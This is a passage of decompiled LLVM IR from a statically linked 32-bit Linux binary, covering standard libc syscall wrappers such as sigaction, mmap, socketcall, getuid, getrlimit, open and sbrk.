  br i1 %v1_804b9fd, label %dec_label_pc_804ba51, label %dec_label_pc_804ba01

dec_label_pc_804ba01:                             ; preds = %entry
  %v2_804ba01 = load i32, i32* %arg2, align 4
  store i32 %v2_804ba01, i32* %stack_var_-148, align 4
  %v1_804ba0a = add i32 %tmp11, 4
  %v3_804ba1c = bitcast i32* %stack_var_-136 to i16*
  %v4_804ba1c = call i32 @memcpy(i16* %v3_804ba1c, i32 %v1_804ba0a, i32 128)
  br label %dec_label_pc_804ba51

dec_label_pc_804ba51:                             ; preds = %entry, %dec_label_pc_804ba01
  %v1_804ba53 = icmp eq i32 %arg3, 0
  br i1 %v1_804ba53, label %dec_label_pc_804ba5b, label %dec_label_pc_804ba57

dec_label_pc_804ba57:                             ; preds = %dec_label_pc_804ba51
  %v2_804ba57 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804ba5b

dec_label_pc_804ba5b:                             ; preds = %dec_label_pc_804ba51, %dec_label_pc_804ba57
  %v0_804ba6a = phi i32 [ 0, %dec_label_pc_804ba51 ], [ %v2_804ba57, %dec_label_pc_804ba57 ]
  br i1 %v1_804b9fd, label %dec_label_pc_804ba68, label %dec_label_pc_804ba61

dec_label_pc_804ba61:                             ; preds = %dec_label_pc_804ba5b
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804ba68

dec_label_pc_804ba68:                             ; preds = %dec_label_pc_804ba5b, %dec_label_pc_804ba61
  %v0_804ba6b = phi %sigaction* [ null, %dec_label_pc_804ba5b ], [ %phitmp, %dec_label_pc_804ba61 ]
  %v5_804ba73 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804ba6b, i32 %v0_804ba6a, i32 8)
  store i32 %v5_804ba73, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ba53, label %dec_label_pc_804bab6, label %dec_label_pc_804ba81

dec_label_pc_804ba81:                             ; preds = %dec_label_pc_804ba68
  %v2_804ba81 = icmp slt i32 %v5_804ba73, 0
  br i1 %v2_804ba81, label %dec_label_pc_804bab6, label %dec_label_pc_804ba85

dec_label_pc_804ba85:                             ; preds = %dec_label_pc_804ba81
  %v3_804ba85 = load i32, i32* %stack_var_-288, align 4
  %v2_804ba89 = inttoptr i32 %arg3 to i32*
  store i32 %v3_804ba85, i32* %v2_804ba89, align 4
  %v2_804ba91 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804ba96 = add i32 %arg3, 4
  %v3_804ba9a = inttoptr i32 %v1_804ba96 to i16*
  %v4_804ba9a = call i32 @memcpy(i16* %v3_804ba9a, i32 %v2_804ba91, i32 128)
  %v2_804baa3 = add i32 %arg3, 132
  %v3_804baa3 = inttoptr i32 %v2_804baa3 to i32*
  %v2_804bab0 = add i32 %arg3, 136
  %v3_804bab0 = inttoptr i32 %v2_804bab0 to i32*
  %v0_804babc.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bab6

dec_label_pc_804bab6:                             ; preds = %dec_label_pc_804ba81, %dec_label_pc_804ba68, %dec_label_pc_804ba85
  %v0_804babc = phi i32 [ %v5_804ba73, %dec_label_pc_804ba81 ], [ %v5_804ba73, %dec_label_pc_804ba68 ], [ %v0_804babc.pre, %dec_label_pc_804ba85 ]
  store i32 %v0_804b9e8, i32* @ebx, align 4
  store i32 %v0_804b9e7, i32* @esi, align 4
  ret i32 %v0_804babc

; uselistorder directives
  uselistorder i1 %v1_804ba53, { 1, 0 }
  uselistorder i1 %v1_804b9fd, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 1, 2, 7 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_804bab6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ba68, { 1, 0 }
  uselistorder label %dec_label_pc_804ba5b, { 1, 0 }
  uselistorder label %dec_label_pc_804ba51, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804bac4 = load i32, i32* @ebx, align 4
  %v2_804bacb = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804bacb, i32* @ebx, align 4
  %v8_804bacf = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804bac4, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_804bacf, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134531584)
  ret i32 %v8_804bacf

; uselistorder directives
  uselistorder i32 %v8_804bacf, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bae0 = load i32, i32* @ebx, align 4
  store i32 %v0_804bae0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804baf3 = call i32 @int80_syscall(i32 102)
  store i32 %v1_804baf3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804baf3, -4095
  br i1 %tmp, label %dec_label_pc_804bb0c, label %dec_label_pc_804bb00

dec_label_pc_804bb00:                             ; preds = %entry
  %v0_804bb00 = load i32, i32* %stack_var_-4, align 4
  %v1_804bb00 = call i32 @__errno_location(i32 %v0_804bb00)
  %v0_804bb05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bb05 = sub i32 0, %v0_804bb05
  %v2_804bb07 = inttoptr i32 %v1_804bb00 to i32*
  store i32 %v1_804bb05, i32* %v2_804bb07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bb0c

dec_label_pc_804bb0c:                             ; preds = %entry, %dec_label_pc_804bb00
  %v0_804bb0d = phi i32 [ %v1_804baf3, %entry ], [ -1, %dec_label_pc_804bb00 ]
  %v2_804bb0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bb0c, i32* @edx, align 4
  %v2_804bb10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bb10, i32* @ebx, align 4
  ret i32 %v0_804bb0d

; uselistorder directives
  uselistorder i32 %v1_804baf3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bb0c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804bb15 = load i32, i32* @esi, align 4
  store i32 %v0_804bb15, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804bb29 = load i32, i32* @ebx, align 4
  %v7_804bb31 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804bb31, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_804bb31, -4095
  br i1 %tmp, label %dec_label_pc_804bb49, label %dec_label_pc_804bb3d

dec_label_pc_804bb3d:                             ; preds = %entry
  %v1_804bb3d = call i32 @__errno_location(i32 %v0_804bb29)
  %v0_804bb42 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bb42 = sub i32 0, %v0_804bb42
  %v2_804bb44 = inttoptr i32 %v1_804bb3d to i32*
  store i32 %v1_804bb42, i32* %v2_804bb44, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804bb49

dec_label_pc_804bb49:                             ; preds = %entry, %dec_label_pc_804bb3d
  %v0_804bb4a = phi i32 [ %v7_804bb31, %entry ], [ -1, %dec_label_pc_804bb3d ]
  %v2_804bb4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804bb4c, i32* @esi, align 4
  ret i32 %v0_804bb4a

; uselistorder directives
  uselistorder i32 %v7_804bb31, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bb49, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bb50 = load i32, i32* @ebx, align 4
  store i32 %v0_804bb50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804bb63 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804bb63, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804bb63, -4095
  br i1 %tmp, label %dec_label_pc_804bb7c, label %dec_label_pc_804bb70

dec_label_pc_804bb70:                             ; preds = %entry
  %v0_804bb70 = load i32, i32* %stack_var_-4, align 4
  %v1_804bb70 = call i32 @__errno_location(i32 %v0_804bb70)
  %v0_804bb75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bb75 = sub i32 0, %v0_804bb75
  %v2_804bb77 = inttoptr i32 %v1_804bb70 to i32*
  store i32 %v1_804bb75, i32* %v2_804bb77, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bb7c

dec_label_pc_804bb7c:                             ; preds = %entry, %dec_label_pc_804bb70
  %v0_804bb7d = phi i32 [ %v4_804bb63, %entry ], [ -1, %dec_label_pc_804bb70 ]
  %v2_804bb7c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bb7c, i32* @edx, align 4
  %v2_804bb80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bb80, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bb7d

; uselistorder directives
  uselistorder i32 %v4_804bb63, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bb7c, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804bb87 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804bb8e = call i32 @getrlimit(i32 7, i32 %v2_804bb87)
  store i32 256, i32* @edx, align 4
  %v2_804bb9b = icmp slt i32 %v2_804bb8e, 0
  br i1 %v2_804bb9b, label %dec_label_pc_804bba3, label %dec_label_pc_804bb9f

dec_label_pc_804bb9f:                             ; preds = %entry
  %v3_804bb9f = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804bb9f, i32* @edx, align 4
  br label %dec_label_pc_804bba3

dec_label_pc_804bba3:                             ; preds = %entry, %dec_label_pc_804bb9f
  %v0_804bba3 = phi i32 [ 256, %entry ], [ %v3_804bb9f, %dec_label_pc_804bb9f ]
  ret i32 %v0_804bba3

; uselistorder directives
  uselistorder label %dec_label_pc_804bba3, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bbac = load i32, i32* @ebx, align 4
  store i32 %v0_804bbac, i32* %stack_var_-4, align 4
  %v1_804bbb5 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804bbb5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bbb5, -4095
  br i1 %tmp, label %dec_label_pc_804bbcc, label %dec_label_pc_804bbc0

dec_label_pc_804bbc0:                             ; preds = %entry
  %v0_804bbc0 = load i32, i32* %stack_var_-4, align 4
  %v1_804bbc0 = call i32 @__errno_location(i32 %v0_804bbc0)
  %v0_804bbc5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bbc5 = sub i32 0, %v0_804bbc5
  %v2_804bbc7 = inttoptr i32 %v1_804bbc0 to i32*
  store i32 %v1_804bbc5, i32* %v2_804bbc7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bbcc

dec_label_pc_804bbcc:                             ; preds = %entry, %dec_label_pc_804bbc0
  %v0_804bbcd = phi i32 [ %v1_804bbb5, %entry ], [ -1, %dec_label_pc_804bbc0 ]
  %v2_804bbd0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bbd0, i32* @ebx, align 4
  ret i32 %v0_804bbcd

; uselistorder directives
  uselistorder i32 %v1_804bbb5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bbcc, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bbd4 = load i32, i32* @ebx, align 4
  store i32 %v0_804bbd4, i32* %stack_var_-4, align 4
  %v1_804bbdd = call i32 @int80_syscall(i32 201)
  store i32 %v1_804bbdd, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bbdd, -4095
  br i1 %tmp, label %dec_label_pc_804bbf4, label %dec_label_pc_804bbe8

dec_label_pc_804bbe8:                             ; preds = %entry
  %v0_804bbe8 = load i32, i32* %stack_var_-4, align 4
  %v1_804bbe8 = call i32 @__errno_location(i32 %v0_804bbe8)
  %v0_804bbed = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bbed = sub i32 0, %v0_804bbed
  %v2_804bbef = inttoptr i32 %v1_804bbe8 to i32*
  store i32 %v1_804bbed, i32* %v2_804bbef, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bbf4

dec_label_pc_804bbf4:                             ; preds = %entry, %dec_label_pc_804bbe8
  %v0_804bbf5 = phi i32 [ %v1_804bbdd, %entry ], [ -1, %dec_label_pc_804bbe8 ]
  %v2_804bbf8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bbf8, i32* @ebx, align 4
  ret i32 %v0_804bbf5

; uselistorder directives
  uselistorder i32 %v1_804bbdd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bbf4, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bbfc = load i32, i32* @ebx, align 4
  store i32 %v0_804bbfc, i32* %stack_var_-4, align 4
  %v1_804bc05 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804bc05, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bc05, -4095
  br i1 %tmp, label %dec_label_pc_804bc1c, label %dec_label_pc_804bc10

dec_label_pc_804bc10:                             ; preds = %entry
  %v0_804bc10 = load i32, i32* %stack_var_-4, align 4
  %v1_804bc10 = call i32 @__errno_location(i32 %v0_804bc10)
  %v0_804bc15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc15 = sub i32 0, %v0_804bc15
  %v2_804bc17 = inttoptr i32 %v1_804bc10 to i32*
  store i32 %v1_804bc15, i32* %v2_804bc17, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bc1c

dec_label_pc_804bc1c:                             ; preds = %entry, %dec_label_pc_804bc10
  %v0_804bc1d = phi i32 [ %v1_804bc05, %entry ], [ -1, %dec_label_pc_804bc10 ]
  %v2_804bc20 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc20, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bc1d

; uselistorder directives
  uselistorder i32 %v1_804bc05, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc1c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_804bc24 = load i32, i32* @global_var_8052510.75, align 16
  store i32 %v0_804bc24, i32* @edx, align 4
  %v1_804bc2f = icmp eq i32 %v0_804bc24, 0
  %v1_804bc31 = icmp eq i1 %v1_804bc2f, false
  %v4_804bc31 = select i1 %v1_804bc31, i32 %v0_804bc24, i32 4096
  ret i32 %v4_804bc31
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc38 = load i32, i32* @ebx, align 4
  store i32 %v0_804bc38, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804bc4b = call i32 @int80_syscall(i32 191)
  store i32 %v1_804bc4b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bc4b, -4095
  br i1 %tmp, label %dec_label_pc_804bc64, label %dec_label_pc_804bc58

dec_label_pc_804bc58:                             ; preds = %entry
  %v0_804bc58 = load i32, i32* %stack_var_-4, align 4
  %v1_804bc58 = call i32 @__errno_location(i32 %v0_804bc58)
  %v0_804bc5d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc5d = sub i32 0, %v0_804bc5d
  %v2_804bc5f = inttoptr i32 %v1_804bc58 to i32*
  store i32 %v1_804bc5d, i32* %v2_804bc5f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bc64

dec_label_pc_804bc64:                             ; preds = %entry, %dec_label_pc_804bc58
  %v0_804bc65 = phi i32 [ %v1_804bc4b, %entry ], [ -1, %dec_label_pc_804bc58 ]
  %v2_804bc68 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc68, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bc65

; uselistorder directives
  uselistorder i32 %v1_804bc4b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc64, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc6c = load i32, i32* @ebx, align 4
  store i32 %v0_804bc6c, i32* %stack_var_-4, align 4
  %v1_804bc75 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804bc75, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804bc75, -4095
  br i1 %tmp, label %dec_label_pc_804bc8c, label %dec_label_pc_804bc80

dec_label_pc_804bc80:                             ; preds = %entry
  %v0_804bc80 = load i32, i32* %stack_var_-4, align 4
  %v1_804bc80 = call i32 @__errno_location(i32 %v0_804bc80)
  %v0_804bc85 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bc85 = sub i32 0, %v0_804bc85
  %v2_804bc87 = inttoptr i32 %v1_804bc80 to i32*
  store i32 %v1_804bc85, i32* %v2_804bc87, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bc8c

dec_label_pc_804bc8c:                             ; preds = %entry, %dec_label_pc_804bc80
  %v0_804bc8d = phi i32 [ %v1_804bc75, %entry ], [ -1, %dec_label_pc_804bc80 ]
  %v2_804bc90 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bc90, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bc8d

; uselistorder directives
  uselistorder i32 %v1_804bc75, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804bc8c, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804bc94 = load i32, i32* @ebx, align 4
  store i32 %v0_804bc94, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804bca7 = call i32 @munmap(i32 %v0_804bc94, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804bca7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804bca7, -4095
  br i1 %tmp, label %dec_label_pc_804bcc0, label %dec_label_pc_804bcb4

dec_label_pc_804bcb4:                             ; preds = %entry
  %v0_804bcb4 = load i32, i32* %stack_var_-4, align 4
  %v1_804bcb4 = call i32 @__errno_location(i32 %v0_804bcb4)
  %v0_804bcb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bcb9 = sub i32 0, %v0_804bcb9
  %v2_804bcbb = inttoptr i32 %v1_804bcb4 to i32*
  store i32 %v1_804bcb9, i32* %v2_804bcbb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bcc0

dec_label_pc_804bcc0:                             ; preds = %entry, %dec_label_pc_804bcb4
  %v0_804bcc1 = phi i32 [ %v4_804bca7, %entry ], [ -1, %dec_label_pc_804bcb4 ]
  %v2_804bcc0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bcc0, i32* @edx, align 4
  %v2_804bcc4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804bcc4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804bcc1

; uselistorder directives
  uselistorder i32 %v4_804bca7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804bcc0, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804bccb = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804bccf = sdiv i32 %sext, 16777216
  store i32 %v4_804bccf, i32* @ecx, align 4
  %v4_804bcd3 = ptrtoint i8* %arg1 to i32
  %v3_804bcd7 = and i32 %arg2, 64
  %v4_804bcd7 = icmp eq i32 %v3_804bcd7, 0
  br i1 %v4_804bcd7, label %dec_label_pc_804bce8, label %dec_label_pc_804bcdc

dec_label_pc_804bcdc:                             ; preds = %entry
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804bce8

dec_label_pc_804bce8:                             ; preds = %entry, %dec_label_pc_804bcdc
  %v0_804bce8 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804bcdc ]
  store i32 %v0_804bce8, i32* @edx, align 4
  store i32 %v4_804bcd3, i32* %ebx.global-to-local, align 4
  %v5_804bcf3 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804bccf)
  store i32 %v5_804bcf3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v5_804bcf3, -4095
  br i1 %tmp, label %dec_label_pc_804bd0b, label %dec_label_pc_804bcff

dec_label_pc_804bcff:                             ; preds = %dec_label_pc_804bce8
  %v1_804bcff = call i32 @__errno_location(i32 %v0_804bccb)
  %v0_804bd04 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bd04 = sub i32 0, %v0_804bd04
  %v2_804bd06 = inttoptr i32 %v1_804bcff to i32*
  store i32 %v1_804bd04, i32* %v2_804bd06, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804bd0b

dec_label_pc_804bd0b:                             ; preds = %dec_label_pc_804bce8, %dec_label_pc_804bcff
  %v0_804bd0e = phi i32 [ %v5_804bcf3, %dec_label_pc_804bce8 ], [ -1, %dec_label_pc_804bcff ]
  store i32 %v0_804bccb, i32* @ebx, align 4
  ret i32 %v0_804bd0e

; uselistorder directives
  uselistorder i32 %v5_804bcf3, { 1, 0, 2 }
  uselistorder i32 %v4_804bccf, { 1, 0 }
  uselistorder i32 %v0_804bccb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bd0b, { 1, 0 }
  uselistorder label %dec_label_pc_804bce8, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804bd23 = inttoptr i32 %arg1 to i8*
  %v4_804bd23 = call i32 @__libc_open(i8* %v3_804bd23, i32 577, i32 %arg2)
  ret i32 %v4_804bd23
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804bd2d = load i32, i32* @ebx, align 4
  %v0_804bd31 = load i32, i32* @global_var_8052544.82, align 4
  %v1_804bd31 = icmp eq i32 %v0_804bd31, 0
  %v1_804bd3c = icmp eq i1 %v1_804bd31, false
  br i1 %v1_804bd3c, label %dec_label_pc_804bd4f, label %dec_label_pc_804bd3e

dec_label_pc_804bd3e:                             ; preds = %entry
  %v1_804bd43 = call i32 @__GI_brk(i32 0)
  %v2_804bd4b = icmp slt i32 %v1_804bd43, 0
  br i1 %v2_804bd4b, label %dec_label_pc_804bd71, label %dec_label_pc_804bd3e.dec_label_pc_804bd4f_crit_edge

dec_label_pc_804bd3e.dec_label_pc_804bd4f_crit_edge: ; preds = %dec_label_pc_804bd3e
  %v0_804bd51.pre = load i32, i32* @global_var_8052544.82, align 4
  br label %dec_label_pc_804bd4f

dec_label_pc_804bd4f:                             ; preds = %dec_label_pc_804bd3e.dec_label_pc_804bd4f_crit_edge, %entry
  %v0_804bd5f = phi i32 [ %v0_804bd51.pre, %dec_label_pc_804bd3e.dec_label_pc_804bd4f_crit_edge ], [ %v0_804bd31, %entry ]
  %v1_804bd4f = icmp eq i32 %arg1, 0
  %v1_804bd56 = icmp eq i1 %v1_804bd4f, false
  br i1 %v1_804bd56, label %dec_label_pc_804bd5c, label %dec_label_pc_804bd58

dec_label_pc_804bd58:                             ; preds = %dec_label_pc_804bd4f
  br label %dec_label_pc_804bd74

dec_label_pc_804bd5c:                             ; preds = %dec_label_pc_804bd4f
  store i32 %v0_804bd5f, i32* @ebx, align 4
  %v2_804bd61 = add i32 %v0_804bd5f, %arg1
  %v1_804bd65 = call i32 @__GI_brk(i32 %v2_804bd61)
  %v2_804bd6d = icmp slt i32 %v1_804bd65, 0
  %v1_804bd6f = icmp eq i1 %v2_804bd6d, false
  br i1 %v1_804bd6f, label %dec_label_pc_804bd5c.dec_label_pc_804bd74_crit_edge, label %dec_label_pc_804bd71

dec_label_pc_804bd5c.dec_label_pc_804bd74_crit_edge: ; preds = %dec_label_pc_804bd5c
  %v0_804bd75.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bd74

dec_label_pc_804bd71:                             ; preds = %dec_label_pc_804bd5c, %dec_label_pc_804bd3e
  br label %dec_label_pc_804bd74

dec_label_pc_804bd74:                             ; preds = %dec_label_pc_804bd5c.dec_label_pc_804bd74_crit_edge, %dec_label_pc_804bd58, %dec_label_pc_804bd71
  %v0_804bd75 = phi i32 [ %v0_804bd75.pre, %dec_label_pc_804bd5c.dec_label_pc_804bd74_crit_edge ], [ %v0_804bd5f, %dec_label_pc_804bd58 ], [ -1, %dec_label_pc_804bd71 ]
  %v2_804bd74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804bd74, i32* @edx, align 4
  store i32 %v0_804bd2d, i32* @ebx, align 4
  ret i32 %v0_804bd75

; uselistorder directives
  uselistorder i32 %v0_804bd5f, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_804bd74, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804bd7d = load i32, i32* @esi, align 4
  %v4_804bd81 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804bd81, i32* @ecx, align 4
  %v2_804bd8d = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804bd8d, label %dec_label_pc_804bda6, label %dec_label_pc_804bd91

dec_label_pc_804bd91:                             ; preds = %entry
  %tmp = icmp ult i32 %arg1, 3
  br i1 %tmp, label %dec_label_pc_804bda6, label %dec_label_pc_804bd96

dec_label_pc_804bd96:                             ; preds = %dec_label_pc_804bd91
  %v1_804bd96 = call i32 @__errno_location(i32 %v0_804bd7d)
  %v1_804bd9b = inttoptr i32 %v1_804bd96 to i32*
  store i32 22, i32* %v1_804bd9b, align 4
  br label %dec_label_pc_804bdcd

dec_label_pc_804bda6:                             ; preds = %dec_label_pc_804bd91, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804bdab = load i32, i32* @ebx, align 4
  %v7_804bdb3 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804bdab, i32* @ebx, align 4
  store i32 %v7_804bdb3, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v7_804bdb3, -4095
  br i1 %tmp11, label %dec_label_pc_804bdcd, label %dec_label_pc_804bdbf

dec_label_pc_804bdbf:                             ; preds = %dec_label_pc_804bda6
  %v1_804bdbf = call i32 @__errno_location(i32 %v0_804bdab)
  %v0_804bdc4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804bdc4 = sub i32 0, %v0_804bdc4
  %v2_804bdc6 = inttoptr i32 %v1_804bdbf to i32*
